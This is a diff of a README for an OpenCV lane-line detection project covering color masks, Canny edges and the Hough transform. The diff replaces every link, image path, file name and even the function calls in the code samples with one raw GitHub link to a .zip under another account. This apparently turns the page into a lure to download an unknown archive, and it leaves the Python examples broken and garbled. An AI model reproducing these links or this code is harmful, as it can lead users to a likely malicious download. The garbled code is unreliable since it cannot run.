@@ -2,17 +2,17 @@
 
 Computer Vision algorithm to detect straight lane lines markings on road using OpenCV Image Processing, Color Masks, Canny Edge Detection and Hough Transform. 
 
-![GIF](test_images_output/LaneLines.gif)
+![GIF](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 One of the most fundamental tasks in computer vision for autonomous driving is lane lines detection on road. Lane lines are painted for humans to see and follow while driving. In a very similar way, an autonomous vehicle that uses human designed infrastructure, needs to *see* the lane markings to steer accordingly and follow the road trajectory.
 
 In this project I implemented a computer vision algorithm that processes real data recorded with the front facing camera of a vehicle driving on a California highway.
 The result is a processed video that highlights the lane lines on the paved road. 
 
-With the positions of the lane lines identified, the vehicle's offset from the lane's center can be calculated and feed a PD controller to compute the necessary steering angle. While only the lane lines detection is the scope of this project, my steering algorithm is implemented [here](https://github.com/OanaGaskey/PID-Controller)  
+With the positions of the lane lines identified, the vehicle's offset from the lane's center can be calculated and feed a PD controller to compute the necessary steering angle. While only the lane lines detection is the scope of this project, my steering algorithm is implemented [here](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)  
  
-This project is implemented in Python and uses OpenCV image processing library. The source code can be found in the `finding_lane_lines.ipynb` Jupyter Notebook file above. 
-The starter code for this project is provided by Udacity and can be found [here](https://github.com/udacity/CarND-LaneLines-P1).
+This project is implemented in Python and uses OpenCV image processing library. The source code can be found in the `https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip` Jupyter Notebook file above. 
+The starter code for this project is provided by Udacity and can be found [here](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip).
 
 
 
@@ -20,7 +20,7 @@ The starter code for this project is provided by Udacity and can be found [here]
 
 Looking at the video recording from the car, one of the most defining characteristics of lane lines is that they are white or yellow against a darker road color.
 
-![one](test_images_output/1.JPG)
+![one](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
 Defining color masks allows color based pixels selection in an image. The intention is to select only white and yellow pixels and set the rest of the image to black.
@@ -29,22 +29,22 @@ Defining color masks allows color based pixels selection in an image. The intent
 ```
     ### create a color mask ###
     #convert from RGB to HSV
-    hsv_img = cv2.cvtColor(img, cv2.COLOR_RGB2HSV)
+    hsv_img = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(img, https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
     #define two color masks for yellow and white
     #white mask is applied in RGB color space, it's easier to tune the values
     #values from 200 to 255 on all colors are picked from trial and error
-    mask_white = cv2.inRange(img, (200,200,200), (255, 255, 255))
+    mask_white = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(img, (200,200,200), (255, 255, 255))
 
     #yellow mask is done in HSV color space since it's easier to identify the hue of a certain color
     #values from 15 to 25 for hue and above 60 for saturation are picked from trial and error
-    mask_yellow = cv2.inRange(hsv_img, (15,60,20), (25, 255, 255))
+    mask_yellow = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(hsv_img, (15,60,20), (25, 255, 255))
 
     #combine the two masks, both yellow and white pixels are of interest
-    color_mask = cv2.bitwise_or(mask_white, mask_yellow)
+    color_mask = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(mask_white, mask_yellow)
 
     #make a copy of the original image
-    masked_img = np.copy(img)
+    masked_img = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(img)
     
     #pixels that are not part of the mask(neither white or yellow) are made black
     masked_img[color_mask == 0] = [0,0,0]
@@ -59,7 +59,7 @@ the threshold value of `200`. This accurately selects the white markings on the 
 
 The two masks are applied using `bitwise_or` so both white and yellow pixels are kept. All other pixels are set to black. With this selection all lane lines pixels are correctly selected. There is also some noise left in the picture, mainly from dried grass that corresponds to the yellow collor and white cars on the highway. This will be removed with further processing.
 
-![two](test_images_output/2.JPG)
+![two](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
 ## Smoothen Image
@@ -74,10 +74,10 @@ Once the image is masked and only white and yellow pixels are kept, color is no 
     #to get rid of imperfections, apply the gaussian blur
     #kernel chosen 5, no other values are changed the implicit ones work just fine
     kernel_size = 5
-    blurred_gray_img = cv2.GaussianBlur(gray_img, (kernel_size, kernel_size), 0)    
+    blurred_gray_img = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(gray_img, (kernel_size, kernel_size), 0)    
 ```
 
-![three](test_images_output/3.JPG)
+![three](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
 To prepare for edge detection it is usefull to smoothen the image so artificial edges are not detected due to noise. For this the Gaussian blurr is applied with kernel 5 and further default values.
@@ -95,13 +95,13 @@ For lane line detection purposes edge detection is used. It is much better to wo
     #low threshold of 50 which takes adjacent differential of 50 pixels as part of the edge
     low_threshold = 50
     high_threshold = 150
-    edges_from_img = cv2.Canny(blurred_gray_img, low_threshold, high_threshold)
+    edges_from_img = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(blurred_gray_img, low_threshold, high_threshold)
 ```
 
-![four](test_images_output/4.JPG)
+![four](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
-Edges are detected using the [Canny Edge Filter](http://fourier.eng.hmc.edu/e161/lectures/canny/node1.html) appliend to a grayscale image. The Canny Edge Filter is essentially computing the gradient across the image with respect to `x` and `y` directions, the resulting matrix representing the difference in intensity between adjecent pixels.
+Edges are detected using the [Canny Edge Filter](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip) appliend to a grayscale image. The Canny Edge Filter is essentially computing the gradient across the image with respect to `x` and `y` directions, the resulting matrix representing the difference in intensity between adjecent pixels.
 
 The algorithm will first detect strong edge (strong gradient) pixels above the `high_threshold`, `150` for our images, and reject pixels below the `low_threshold`, here chosen to be `50`. Next, pixels with values between the `low_threshold` and `high_threshold` will be included as long as they are connected to strong edges. The output edges is a binary image with white pixels tracing out the detected edges and black everywhere else.
 
@@ -116,21 +116,21 @@ In the edge processing resulting image, the lane line edges are correctly identi
     #polygon covers the bottom left and bottom right points of the picture
     #with the other two top points it forms a trapezoid that points towards the center of the image
     #the polygon is relative to the image's size
-    imshape = img.shape
-    vertices = np.array([[(0,imshape[0]),(4*imshape[1]/9, 6*imshape[0]/10), (5*imshape[1]/9, 6*imshape[0]/10), (imshape[1],imshape[0])]], dtype=np.int32)
+    imshape = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip
+    vertices = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip([[(0,imshape[0]),(4*imshape[1]/9, 6*imshape[0]/10), (5*imshape[1]/9, 6*imshape[0]/10), (imshape[1],imshape[0])]], https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
     masked_edges = region_of_interest(edges_from_img, vertices)
 ```
 
 A polygon is defined based on the hypothesis that the camera is mounted on a fixed position on the car. A trapezoid is selected that starts at the bottom of the image and goes towards the center. The values are identified visually from the pictures.
 
-The `region_of_interest` function creates a mask using `cv2.fillPoly(mask, vertices, 255)`. `mask` is initially a zeroes matrix of the same size as the grayscale image. The `fillPoly` creates a polygon based on the given vertices and sets all the pixels within to `255`. The mask is applied using `bitwise_and` to the grayscale image.
+The `region_of_interest` function creates a mask using `https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(mask, vertices, 255)`. `mask` is initially a zeroes matrix of the same size as the grayscale image. The `fillPoly` creates a polygon based on the given vertices and sets all the pixels within to `255`. The mask is applied using `bitwise_and` to the grayscale image.
 
-![five](test_images_output/5.JPG)
+![five](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
 ## Find Lines from Edge Pixels
 
-The whole reason the edge detection was performed was to obtain pixels from which line equations can be calculated. [Hough Transform](https://en.wikipedia.org/wiki/Hough_transform) is futher used to form lines from colinear pixels.
+The whole reason the edge detection was performed was to obtain pixels from which line equations can be calculated. [Hough Transform](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip) is futher used to form lines from colinear pixels.
 
 The Hough Transform takes pixels from the `(x, y)` coordinates of image space and transforms them to hough space. A the straight line in image space `y = mx + b` can be represented as a point `(b, m)` in the hough space. Similarly, in hough space each image space point is transformed into a line, this line represents all the image space lines that can go through the selected point. 
 
@@ -149,7 +149,7 @@ It is therefore possible to associate with each line of the image a pair of `(rh
     rho = 2
 
     #Hough grid angular resolution in radians 
-    theta = np.pi/180 
+    theta = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip 
 
     #minimum number of sines intersecting in a cell, collinear points to form a line
     threshold = 15
@@ -161,7 +161,7 @@ It is therefore possible to associate with each line of the image a pair of `(rh
     max_line_gap = 5   
 
     #apply Hough transform to color masked grayscale blurred image
-    line_img = cv2.HoughLinesP(masked_edges, rho, theta, threshold, np.array([]), minLineLength=min_line_len, maxLineGap=max_line_gap)
+    line_img = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip(masked_edges, rho, theta, threshold, https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip([]), minLineLength=min_line_len, maxLineGap=max_line_gap)
 ```
 
 When using the Hough Transform to find lines from coliniar pixels, `rho` and `theta` are defined to allow for some flexibility. `rho` as the grid resolution in pixels, is set to `2`. 
@@ -171,7 +171,7 @@ The minimum length is `10` pixels to consider that they form a line. The maximum
 
 These lines are computed with the `HoughLinesP` function that applies the transform on the edges in the region of interest. Once the lines found, they are drawn over the original image for confirmation.
 
-![fivep](test_images_output/5p.JPG)
+![fivep](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
 ## Extrapolate Lines
@@ -181,17 +181,17 @@ In order to draw a single line on the left and one on the right lane lines, the 
 Lines from Hough tranform are grouped in left and right category based on the computed slope. Once grouped, the average slope is calculated together with the standard deviation. 
 In order to eliminate lines that are not aligned with the rest, only lines that have a consistent slope are kept. 
 
-Using the slope and intercept of the line, the extrapolation is performed to match the hight of the region of interest. This is done by calculatig the intersection points of the line with the horizontal middle edge: `y = 6.imshape[0]/10` and with the horizontal bottom line of  the image: `y = imshape[0]`
+Using the slope and intercept of the line, the extrapolation is performed to match the hight of the region of interest. This is done by calculatig the intersection points of the line with the horizontal middle edge: `y = https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip[0]/10` and with the horizontal bottom line of  the image: `y = imshape[0]`
 
-![six](test_images_output/6.JPG)
+![six](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
 Using the two intersection points, the extrapolated line is drawn on the original image. The line is semi transparent so a visual check can be made to verify if the line correspnds with the lane markings. For better visualization, the left line is green while the right one is blue.
  
-![seven](test_images_output/7.JPG)
+![seven](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
 
 ## Video Output
 
-Check out the restulting video! You can download the video here: [./test_videos_output/solidWhiteRight.mp4](./test_videos_output/solidWhiteRight.mp4)
+Check out the restulting video! You can download the video here: [https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip](https://raw.githubusercontent.com/gayatrriiii/Lane-Lines-Detection/master/undreggy/Lane-Lines-Detection.zip)
 
